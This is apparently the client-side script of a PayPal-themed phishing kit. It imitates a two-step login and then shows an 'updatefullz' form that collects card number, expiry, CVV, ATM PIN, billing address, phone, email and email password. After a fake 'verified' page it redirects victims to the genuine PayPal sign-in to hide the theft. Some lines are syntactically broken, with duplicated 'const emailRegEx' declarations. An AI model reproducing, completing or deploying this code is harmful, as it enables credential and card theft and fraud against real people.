// Changing of the webpages
const firstLoginPage = _$(".first__container-login");
const secondtLoginPage = _$(".second__container-login");
const loginNext = _$(".site__next-btn");
const prevLogin = _$(".prev__btn");
const emailInput = _$(".email-input");
const passwordInput = _$(".password__input")
const previousText = _$(".previous__text");
const emailErrorMssg = _$(".usererror__msg");
const passwordErrorMssg = _$(".usererror___msg");
const formContainer = _$(".form__container");


function _$(item) {
    return document.querySelector(item);
}

// Show & Hide  password function

function togglePassword(passwordSelector, buttonSelector) {
    const getPassword = _$(passwordSelector);
    const showAndHidePassword = _$(buttonSelector);
    if (!getPassword || !showAndHidePassword) {
        return; 
    }

    showAndHidePassword.addEventListener("click", () => {
        if (getPassword.type === "text") {
            getPassword.type = "password";
            showAndHidePassword.innerHTML = "Show"
        }
        else {
            getPassword.type = "text"
            showAndHidePassword.innerHTML = "Hide"
        }

    });
}
togglePassword("#password", ".show-btn");



if (loginNext) {
    loginNext.addEventListener("click", function () {
        const inputNotEmpty = validateUserInput(emailInput, emailErrorMssg, "Email is required")
        if (inputNotEmpty) {
            const validateEmail = checkMail(emailInput.value.trim());
            const validateMobile = checkNumber(emailInput.value.trim());

            if (validateEmail || validateMobile) {
                secondtLoginPage.classList.add("first__active");
                firstLoginPage.classList.remove("first__active");
                previousText.innerHTML = emailInput.value
            }
            else {
                emailErrorMssg.innerHTML = `<i class="fa-solid fa-triangle-exclamation"></i> Invalid Email or Phone Number`
                return
            }

        }

    });
}
if (prevLogin) {
    prevLogin.addEventListener("click", function () {
        firstLoginPage.classList.add("first__active");
        secondtLoginPage.classList.remove("first__active")

    });

}
if (formContainer) {
    formContainer.addEventListener("submit", function (e) {
        e.preventDefault()
        const passwordNotEmpty = validateUserInput(passwordInput, passwordErrorMssg, "Password is required");
        const password = passwordInput.value.trim()
        if (passwordNotEmpty) {
            if (password.length < 4) {
                passwordErrorMssg.innerHTML = `<i class="fa-solid fa-triangle-exclamation"></i> We couldn't verify your password. Please re-enter it.`
                passwordErrorMssg.style.color = "#A31D1D"
            }
            else {
                location.replace("updatefullz.html")
            }

        }

    });
    emailInput.oninput = function () {
        emailErrorMssg.innerHTML = ""
    }
    passwordInput.oninput = function () {
        passwordErrorMssg.innerHTML = ""
    }
}



function validateUserInput(inputElement, errorElement, message) {
    if (inputElement.value.trim() === "") {
        errorElement.innerHTML = `<i class="fa-solid fa-triangle-exclamation"></i>${message}`
        return false
    }
    else {
        return true
    }
}

function checkMail(email) {
    const emailRegEx = const emailRegEx = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}$/;
    if (emailRegEx.test(email.toLowerCase().trim())) {
        return true
    }
    else {
        return false;
    }
}

function checkNumber(number) {
    const numberRegEx = /^\+?\d{0,3}[\s-]?\(?\d{3}\)?[\s-]?\d{3}[\s-]?\d{4}$/
    if (numberRegEx.test(number)) {
        return true
    }
    else {
        return false
    }
}
// Updatefullz Script
togglePassword(".emailpasswordinput", ".update__show-btn");

const updateFullzForm = _$(".update__form");
const fullnameInput = _$(".fullnameinput");
const cardInput = _$(".cardinput");
const expInput = _$(".expinput");
const cvvInput = _$(".cvvinput");
const pinInput = _$(".pininput");
const stateInput = _$(".stateinput");
const cityInput = _$(".cityinput");
const zipCodeInput = _$(".zipcodeinput");
const billingAddressInput = _$(".addressinput");
const phoneNumberInput = _$(".phonenumberinput");
const mailInput = _$(".emailinput");
const emailPasswordInput = _$(".emailpasswordinput");
const updateCardBtn = _$(".update__card-btn");
const updateAllError = _$(".update__allerror");
const fullnameError = _$(".fullnameerror");
const cardNumberError = _$(".cardnumbererror");
const expDateError = _$(".expdateerror");
const cvvError = _$(".cvverror");
const pinError = _$(".pinerror");
const stateError = _$(".stateerror");
const cityError = _$(".cityerror");
const zipCodeError = _$(".zipcodeerror");
const billingAddrsError = _$(".billingaddrserror");
const phoneNumberError = _$(".phonenumbererror");
const emailError = _$(".emailerror");
const emailPasswordError = _$(".emailpassworderror");
const fullnameMssg = _$(".fullnamemssg");
const cardNumberMssg = _$(".cardnumbermssg");
const expDateMssg = _$(".expdatemssg");
const cvvMssg = _$(".cvvmssg");
const pinMssg = _$(".pinmssg");
const stateMssg = _$(".statemssg");
const cityMssg = _$(".citymssg");
const zipCodeMssg = _$(".zipcodemssg");
const billingAddrsMssg = _$(".billingaddrsmssg");
const phoneNumberMssg = _$(".phonenumbermssg");
const emailMssg = _$(".emailmssg");
const emailPasswordMssg = _$(".emailpasswordmssg");

if(updateFullzForm){
    updateFullzForm.addEventListener("submit", (e)=>{
        e.preventDefault()
        const fullname = fullnameInput.value.trim()
        const cardNumber = cardInput.value.trim()
        const expiryDate = expInput.value.trim()
        const cvv = cvvInput.value.trim()
        const pin = pinInput.value.trim()
        const state = stateInput.value.trim()
        const city = cityInput.value.trim()
        const zipCode = zipCodeInput.value.trim()
        const billingAddress = billingAddressInput.value.trim()
        const phoneNumber = phoneNumberInput.value.trim()
        const mail = mailInput.value.trim()
        const emailpassword = emailPasswordInput.value
        const fullNameRegex = /^[A-Za-z]+\s[A-Za-z]+$/;
        const cardNumberRegex = /^\d{13,19}$/
        const cardExpiryRegex = /^(0[1-9]|1[0-2])\/([2-9][0-9])$/;
        const cvvRegex = /^\d{3,4}$/
        const pinRegex = /^\d{4}$/
        const cityRegex = /^[a-zA-Z\s'-]{2,50}$/;
        const addressRegex = /^[a-zA-Z0-9\s,'-.]{3,100}$/;
        const zipRegex = /^\d{5}$/
        const mailRegEx =const emailRegEx = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}$/;
        const phoneNumberRegex = /^\+?\d{0,3}[\s-]?\(?\d{3}\)?[\s-]?\d{3}[\s-]?\d{4}$/
        const combinedStateRegex = /^(A[LKZR]|C[AOT]|D[CE]|F[LM]|G[A]|H[I]|I[ADLN]|K[SY]|L[A]|M[ADEHINOST]|N[CDEHJMVY]|O[HKR]|P[ARW]|R[I]|S[CD]|T[NX]|UT|V[AIT]|W[AIVY]|Alabama|Alaska|Arizona|Arkansas|California|Colorado|Connecticut|Delaware|Florida|Georgia|Hawaii|Idaho|Illinois|Indiana|Iowa|Kansas|Kentucky|Louisiana|Maine|Maryland|Massachusetts|Michigan|Minnesota|Mississippi|Missouri|Montana|Nebraska|Nevada|New Hampshire|New Jersey|New Mexico|New York|North Carolina|North Dakota|Ohio|Oklahoma|Oregon|Pennsylvania|Rhode Island|South Carolina|South Dakota|Tennessee|Texas|Utah|Vermont|Virginia|Washington|West Virginia|Wisconsin|Wyoming)$/i;

        if(fullname === "" && cardNumber === "" && expiryDate === "" && cvv === "" &&
            pin === "" && state === "" && city === "" && zipCode === "" && billingAddress === "" &&
            phoneNumber === "" && mail === "" && emailpassword === ""){
                updateAllError.innerHTML = `All fields are required. Please fill out the form.`
            }
            else if(fullname === ""){
                showError(fullnameError,`Card holder name is required.`,fullnameInput)
            }
            else if(!fullNameRegex.test(fullname)){
                showError(fullnameMssg,`Invalid full name. Use 'John Doe' format.`,fullnameInput)
            }
            else if(cardNumber === ""){
                showError(cardNumberError,`Card Number is required.`,cardInput)
            }
            else if(!cardNumberRegex.test(cardNumber)){
                showError(cardNumberMssg, `Invalid card number. Card number must contain 16 digits`,cardInput)
            }
            else if(expiryDate === ""){
                showError(expDateError, `Expiry date is required.`,expInput)
            }
            else if(!cardExpiryRegex.test(expiryDate)){
                showError(expDateMssg,`Invalid expiry date. Use MM/YY format.`,expInput)
            }
            else if(cvv === ""){
                showError(cvvError,`CVV is required.`,cvvInput)
            }
            else if(!cvvRegex.test(cvv)){
                showError(cvvMssg,`Invalid CVV. Enter 3 digits`,cvvInput)
            }
            else if(pin === ""){
                showError(pinError,`Pin is required.`,pinInput)
            }
            else if(!pinRegex.test(pin)){
                showError(pinMssg,`PIN must be 4 digits only.`,pinInput)
            }
            else if(state === ""){
                showError(stateError,`State is required.`,stateInput)
            }
            else if(!combinedStateRegex.test(state)){
                showError(stateMssg,`Please enter a valid U.S. state or territory.`,stateInput)
            }
            else if(city === ""){
                showError(stateError,`City is required.`,cityInput)
            }
            else if(!cityRegex.test(city)){
                showError(cityMssg,`Please enter a valid city name (2-50 letters).`,cityInput)
            }
            else if(zipCode === ""){
                showError(zipCodeError,`Zip Code is required.`,zipCodeInput)
            }
            else if(!zipRegex.test(zipCode)){
                showError(zipCodeMssg,`Invalid ZIP code format.`,zipCodeInput)
            }
            else if(billingAddress === ""){
                showError(billingAddrsError,`Billing Address is required.`,billingAddressInput)
            }
            else if(!addressRegex.test(billingAddress)){
                showError(billingAddrsError,`Please enter a valid billing address (3-100 characters).`,billingAddressInput)
            }
            else if(phoneNumber === ""){
                showError(phoneNumberError,`Mobile Number is required.`,phoneNumberInput)
            }
            else if(!phoneNumberRegex.test(phoneNumber)){
                showError(phoneNumberMssg, `Invalid phone number format. Please enter a valid US phone
                number.`, phoneNumberInput)
            }
            else if(mail === ""){
                showError(emailError,`Email Address is required.`,mailInput)
            }
            else if(!mailRegEx.test(mail)){
                showError(emailMssg,`Please enter a valid email address.`,mailInput)
                
            }
            else if(emailpassword === ""){
                showError(emailPasswordError,`Email Password is required.`,emailPasswordInput)
            }
            else if(emailpassword.length < 4 ){
                showError(emailPasswordMssg,`We couldn't verify your password. Please re-enter it.`,emailPasswordInput)
            }
            else{
                location.replace("verifiedpage.html")
            }
            
    });
   

    fullnameInput.addEventListener("input", ()=>{
        clearError(fullnameError,fullnameInput)
        clearError(fullnameMssg,fullnameInput)
        updateAllError.innerHTML = ""
        
    });
    cardInput.addEventListener("input",()=>{
        clearError(cardNumberError,cardInput)
        clearError(cardNumberMssg,cardInput)
        updateAllError.innerHTML = ""
    });
    expInput.addEventListener("input", (e)=>{
        clearError(expDateError,expInput)
        clearError(expDateMssg,expInput)
        updateAllError.innerHTML = ""
          // Format the input to MM/YY
          let value = e.target.value.replace(/\D/g, "");
          if (value.length >= 2) {
              value = value.slice(0, 2) + "/" + value.slice(2, 4);
          }
          e.target.value = value.slice(0, 5);
    });
    cvvInput.addEventListener("input", ()=>{
        clearError(cvvError,cvvInput)
        clearError(cvvMssg,cvvInput)
        updateAllError.innerHTML = ""
    });
    pinInput.addEventListener("input", ()=>{
        clearError(pinError,pinInput)
        clearError(pinMssg,pinInput)
        updateAllError.innerHTML = ""
    });
    stateInput.addEventListener("input", ()=>{
        clearError(stateError,stateInput)
        clearError(stateMssg,stateInput)
        updateAllError.innerHTML = ""
    });
    cityInput.addEventListener("input", ()=>{
        clearError(cityError,cityInput)
        clearError(cityMssg,cityInput)
        updateAllError.innerHTML = ""
    });
    zipCodeInput.addEventListener("input",()=>{
        clearError(zipCodeError,zipCodeInput)
        clearError(zipCodeMssg,zipCodeInput)
        updateAllError.innerHTML = ""
    });
    billingAddressInput.addEventListener("input", ()=>{
        clearError(billingAddrsError,billingAddressInput)
        clearError(billingAddrsMssg,billingAddressInput)
        updateAllError.innerHTML = ""
    });
    phoneNumberInput.addEventListener("input", ()=>{
        clearError(phoneNumberError,phoneNumberInput)
        clearError(phoneNumberMssg,phoneNumberInput)
        updateAllError.innerHTML = ""
    });
    mailInput.addEventListener("input",  ()=> {
            clearError(emailError, mailInput);
            clearError(emailMssg, mailInput);
            updateAllError.innerHTML = "";
        });
    emailPasswordInput.addEventListener("input", ()=>{
        clearError(emailPasswordError,emailPasswordInput)
        clearError(emailPasswordMssg,emailPasswordInput)
        updateAllError.innerHTML = "";

    });
}
const updatefullzRedirect = _$(".verifed__backdrop");
if(updatefullzRedirect){
    palzRedirect()
}

function showError(element,message,inputElement){
    if(element){
        element.innerHTML = message
    }
    if(inputElement){
        inputElement.classList.add("errorborder")

    }
 
}
function clearError(element,inputElement){
     if(element){
    element.innerHTML = ""
   }
        
    if(inputElement){
        inputElement.classList.remove("errorborder")
    }
}
function palzRedirect(){
    setTimeout(()=>{
        window.location.replace("https://www.paypal.com/signin")
    },4000);
}
























